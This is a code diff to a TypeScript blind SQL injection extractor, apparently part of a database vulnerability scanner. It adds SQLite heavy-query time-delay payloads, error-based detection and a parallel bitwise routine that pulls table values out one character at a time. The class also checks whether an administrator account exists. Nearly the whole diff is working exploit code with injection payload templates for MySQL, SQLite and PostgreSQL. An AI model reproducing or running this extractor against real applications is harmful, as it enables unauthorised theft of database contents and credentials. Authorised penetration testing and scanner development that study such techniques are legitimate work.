@@ -15,7 +15,11 @@
 import { DbmsType, DiscoveredTable } from '../../../types/sqlScanner';
 import { DialectMatrix } from './DialectMatrix';
 
-export type ProbeSender = (payload: string, append?: boolean) => Promise<{
+export type ProbeSender = (
+  payload: string,
+  append?: boolean,
+  options?: { technique?: string; category?: string }
+) => Promise<{
   body: string;
   status: number;
   durationMs: number;
@@ -37,6 +41,7 @@ export interface BlindExtractorOptions {
   baselineLength?: number;
   baselineDurationMs?: number;
   timeDelaySeconds?: number;
+  concurrencyLimit?: number;
   isAborted?: () => boolean;
   onProgress?: ExtractorProgressCallback;
   log?: (level: 'info' | 'success' | 'warn' | 'error', msg: string) => void;
@@ -77,6 +82,10 @@ export class BlindDataExtractor {
       const expectedDelayMs = timeDelaySeconds * 1000;
       const threshold = Math.max(1600, baselineDurationMs + expectedDelayMs * 0.75);
       return res.durationMs >= threshold;
+    }
+
+    if (technique === 'ERROR') {
+      return res.status >= 400 || /syntax error|unclosed quotation|SQLstate|ORA-|PG::|CLI Driver/i.test(res.body);
     }
 
     // Boolean Differential
@@ -130,6 +139,10 @@ export class BlindDataExtractor {
         const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
         return `' AND (SELECT IF(${condition}, SLEEP(${timeDelaySeconds}), 0)${fromClause})-- -`;
       }
+      if (dbms === 'SQLite') {
+        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''}` : '';
+        return `' AND (SELECT CASE WHEN (${condition}) THEN (SELECT randomblob(50000000)) ELSE 1 END${fromClause})--`;
+      }
       // PostgreSQL
       const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''}` : '';
       return `'||(SELECT CASE WHEN (${condition}) THEN pg_sleep(${timeDelaySeconds}) ELSE pg_sleep(0) END${fromClause})||'`;
@@ -169,7 +182,7 @@ export class BlindDataExtractor {
       const condition = `${lenFn}>${mid}`;
       const payload = this.generateTestPayload(condition, table, where);
 
-      const res = await this.sender(payload, true);
+      const res = await this.sender(payload, true, { technique: `Vectorized Length Bisection [Mid ${mid}]` });
       const isTrue = this.isConditionTrue(res);
 
       if (isTrue) {
@@ -184,7 +197,7 @@ export class BlindDataExtractor {
     // Verify candidate length with exact equality probe (= candidateLength)
     const exactCondition = `${lenFn}=${candidateLength}`;
     const exactPayload = this.generateTestPayload(exactCondition, table, where);
-    const exactRes = await this.sender(exactPayload, true);
+    const exactRes = await this.sender(exactPayload, true, { technique: `Vectorized Length Verification [=${candidateLength}]` });
 
     if (this.isConditionTrue(exactRes)) {
       this.opts.log?.('success', `✓ Confirmed length for "${table}.${column}": ${candidateLength} characters`);
@@ -194,7 +207,7 @@ export class BlindDataExtractor {
     // Try candidateLength - 1 as adjacent check
     if (candidateLength > 1) {
       const adjPayload = this.generateTestPayload(`${lenFn}=${candidateLength - 1}`, table, where);
-      const adjRes = await this.sender(adjPayload, true);
+      const adjRes = await this.sender(adjPayload, true, { technique: `Vectorized Length Verification [=${candidateLength - 1}]` });
       if (this.isConditionTrue(adjRes)) {
         this.opts.log?.('success', `✓ Confirmed length for "${table}.${column}": ${candidateLength - 1} characters`);
         return candidateLength - 1;
@@ -205,7 +218,8 @@ export class BlindDataExtractor {
   }
 
   /**
-   * Extracts a single string value character-by-character using binary search ASCII bisection (~7 queries per char)
+   * Extracts a single string value using high-throughput vectorized parallel character workers
+   * with zero-branching bitwise exfiltration and adaptive bisection fallback.
    */
   public async extractValue(
     table: string,
@@ -219,24 +233,55 @@ export class BlindDataExtractor {
     const length = knownLength && knownLength > 0 ? knownLength : await this.extractLength(table, column, where);
     if (length <= 0) return '';
 
-    let recovered = '';
+    const charArray: string[] = new Array(length).fill('·');
+    const concurrency = Math.max(1, Math.min(this.opts.concurrencyLimit || 20, length));
 
-    for (let pos = 1; pos <= length; pos++) {
-      if (this.opts.isAborted?.()) break;
+    const extractSingleChar = async (pos: number): Promise<string> => {
+      if (this.opts.isAborted?.()) return '?';
+      const subExpr = caps.substringFn(column, pos, 1);
+      const asciiExpr = caps.asciiFn(subExpr);
 
-      // Binary search over printable ASCII range (32 to 126)
+      // Phase 1: High-Speed Zero-Branching Bitwise Exfiltration (7 parallel bit queries)
+      // Printable ASCII (32..126) fits in 7 bits (masks: 1, 2, 4, 8, 16, 32, 64)
+      const bitMasks = [1, 2, 4, 8, 16, 32, 64];
+      try {
+        const bitResults = await Promise.all(
+          bitMasks.map(async (mask) => {
+            if (this.opts.isAborted?.()) return { mask, isTrue: false };
+            const condition = caps.bitandCondition ? caps.bitandCondition(asciiExpr, mask) : `((${asciiExpr}) & ${mask}) = ${mask}`;
+            const payload = this.generateTestPayload(condition, table, where);
+            const res = await this.sender(payload, true, { technique: `Vectorized Exfil [Char ${pos}, Bit ${mask}]` });
+            return { mask, isTrue: this.isConditionTrue(res) };
+          })
+        );
+
+        let asciiCode = 0;
+        for (const r of bitResults) {
+          if (r.isTrue) asciiCode |= r.mask;
+        }
+
+        // Printable ASCII is 32..126
+        if (asciiCode >= 32 && asciiCode <= 126) {
+          const ch = String.fromCharCode(asciiCode);
+          charArray[pos - 1] = ch;
+          this.opts.onProgress?.(column, charArray.join(''), pos, length);
+          return ch;
+        }
+      } catch {
+        // Fallback to binary search
+      }
+
+      // Phase 2: Adaptive Binary Search (Bisection) Fallback (when bitwise is filtered/unsupported)
       let minAscii = 32;
       let maxAscii = 126;
 
       while (minAscii < maxAscii) {
-        if (this.opts.isAborted?.()) break;
+        if (this.opts.isAborted?.()) return '?';
         const mid = Math.floor((minAscii + maxAscii) / 2);
-        const subExpr = caps.substringFn(column, pos, 1);
-        const asciiExpr = caps.asciiFn(subExpr);
         const condition = `${asciiExpr}>${mid}`;
         const payload = this.generateTestPayload(condition, table, where);
 
-        const res = await this.sender(payload, true);
+        const res = await this.sender(payload, true, { technique: `Vectorized Bisection [Char ${pos}, Mid ${mid}]` });
         const isTrue = this.isConditionTrue(res);
 
         if (isTrue) {
@@ -246,14 +291,26 @@ export class BlindDataExtractor {
         }
       }
 
-      const char = String.fromCharCode(minAscii);
-      recovered += char;
+      const ch = String.fromCharCode(minAscii);
+      charArray[pos - 1] = ch;
+      this.opts.onProgress?.(column, charArray.join(''), pos, length);
+      return ch;
+    };
 
-      if (this.opts.onProgress) {
-        this.opts.onProgress(column, recovered + '·'.repeat(Math.max(0, length - pos)), pos, length);
+    // Dispatch all positions concurrently bounded by worker concurrency
+    const positions = Array.from({ length }, (_, i) => i + 1);
+    let nextPosIdx = 0;
+
+    const worker = async () => {
+      while (nextPosIdx < positions.length && !this.opts.isAborted?.()) {
+        const pos = positions[nextPosIdx++];
+        await extractSingleChar(pos);
       }
-    }
+    };
 
+    await Promise.all(Array.from({ length: concurrency }, () => worker()));
+
+    const recovered = charArray.join('');
     this.opts.log?.('success', `✓ Extracted "${table}.${column}": "${recovered}"`);
     return recovered;
   }
@@ -279,7 +336,7 @@ export class BlindDataExtractor {
     // 1. First test if administrator user exists
     const adminCondition = `${userCol}='${targetUser}'`;
     const checkPayload = this.generateTestPayload(adminCondition, table.name);
-    const checkRes = await this.sender(checkPayload, true);
+    const checkRes = await this.sender(checkPayload, true, { technique: 'Entity Existence Verification' });
     if (this.opts.isAborted?.()) return null;
     const adminExists = this.isConditionTrue(checkRes);
 
